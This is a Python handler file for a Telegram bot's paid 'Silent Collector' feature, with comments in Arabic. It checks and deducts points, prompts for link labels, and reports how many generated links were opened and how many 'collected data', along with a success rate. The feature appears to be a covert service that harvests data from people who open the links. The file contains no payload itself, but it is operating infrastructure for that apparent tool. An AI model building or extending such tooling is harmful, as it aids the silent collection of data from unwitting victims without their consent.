# bot_handlers/callbacks/silent.py
# ============================================================
# Silent Collector — مع تأكيد الأدوات
# ============================================================

from config import bot
from imports_manager import (
    can_use_tool, consume_usage,
    get_user_silent_sessions,
)
from logging_config import get_logger

from ..helpers import safe_edit, deny_message, h
from ..keyboards import silent_collector_panel, main_menu
from ..messages import SILENT_PROMPT, SILENT_NEW_PROMPT

logger = get_logger("bot_handlers.callbacks.silent")


def handle(call, chat_id, user_id, data):

    # ═══════════════════════════════════════════════════
    # 🎯 طلب Silent → تأكيد
    # ═══════════════════════════════════════════════════
    if data in ("gen_silent", "silent_new"):
        bot.answer_callback_query(call.id)
        try:
            from points_system import (
                build_tool_confirm_text,
                build_tool_confirm_keyboard,
            )
            text, can_proceed = build_tool_confirm_text(user_id, "silent")
            m = build_tool_confirm_keyboard("silent", can_proceed)
            safe_edit(call, text, reply_markup=m)
            return
        except Exception as e:
            logger.exception(f"tool_confirm silent error: {e}")
            _start_silent(call, chat_id, user_id, data)
            return

    # ═══════════════════════════════════════════════════
    # بعد التأكيد → ينفذ
    # ═══════════════════════════════════════════════════
    if data == "silent_start":
        _start_silent(call, chat_id, user_id, "gen_silent")
        return

    if data == "silent_stats":
        bot.answer_callback_query(call.id, "📊 جاري الحساب...")
        try:
            sessions = get_user_silent_sessions(user_id, limit=200) or []
            total = len(sessions)
            accessed = sum(1 for s in sessions if s.get('accessed'))
            collected = sum(1 for s in sessions if s.get('collected'))
            text = (
                "📊 <b>إحصائيات Silent Collector</b>\n"
                "━━━━━━━━━━━━━━━━━━\n\n"
                f"🔗 <b>إجمالي اللينكات:</b> <code>{total}</code>\n"
                f"👁️ <b>تم فتحها:</b> <code>{accessed}</code>\n"
                f"✅ <b>جمعت بيانات:</b> <code>{collected}</code>\n"
            )
            if total > 0:
                rate = (collected / total) * 100
                text += f"📈 <b>نسبة النجاح:</b> <code>{rate:.1f}%</code>\n"
        except Exception as e:
            logger.exception(f"silent_stats error: {e}")
            text = f"❌ خطأ: {h(str(e)[:200])}"
        safe_edit(call, text, reply_markup=silent_collector_panel())
        return

    if data == "silent_recent":
        bot.answer_callback_query(call.id, "📋 جاري التحميل...")
        try:
            sessions = get_user_silent_sessions(user_id, limit=10) or []
            if not sessions:
                safe_edit(call, "📭 <b>لا يوجد لينكات بعد</b>",
                          reply_markup=silent_collector_panel())
                return
            lines = ["📋 <b>آخر 10 لينكات</b>\n━━━━━━━━━━━━━━━━━━\n"]
            for s in sessions[:10]:
                sid = s.get('session_id', '?')[:12]
                label = s.get('label', '')
                accessed = s.get('accessed', False)
                collected = s.get('collected', False)
                icon = "✅" if collected else ("👁️" if accessed else "⏳")
                label_text = f" — {h(label)}" if label else ""
                lines.append(f"{icon} <code>{h(sid)}</code>{label_text}")
            safe_edit(call, "\n".join(lines), reply_markup=silent_collector_panel())
        except Exception as e:
            logger.exception(f"silent_recent error: {e}")
            safe_edit(call, f"❌ خطأ: {h(str(e)[:200])}",
                      reply_markup=silent_collector_panel())
        return


def _start_silent(call, chat_id, user_id, data):
    """يبدأ عملية Silent بعد التأكيد"""
    bot.answer_callback_query(call.id, "✅ جاري البدء...")

    # ─── تحقق واخصم ───
    check = can_use_tool(user_id, "silent")
    if not check["allowed"]:
        if check["reason"] == "insufficient_points":
            from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
            m = InlineKeyboardMarkup()
            m.add(InlineKeyboardButton("💰 نقاطي", callback_data="points_menu"))
            m.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
            safe_edit(
                call,
                f"❌ <b>رصيدك غير كافي!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"💰 <b>المطلوب:</b> <code>{check.get('cost', 0)}</code> نقطة\n"
                f"💎 <b>رصيدك:</b> <code>{check.get('balance', 0)}</code> نقطة\n"
                f"⚠️ <b>ناقصك:</b> <code>{check.get('needed', 0)}</code> نقطة",
                reply_markup=m
            )
            return
        safe_edit(call, "❌ لا يمكن استخدام الأداة", reply_markup=main_menu(user_id))
        return

    consume_usage(user_id, "silent")

    prompt = SILENT_NEW_PROMPT if data == "silent_new" else SILENT_PROMPT
    msg = bot.send_message(chat_id, prompt, parse_mode="HTML")

    from ..steps.silent_steps import silent_label_handler
    bot.register_next_step_handler(msg, silent_label_handler)
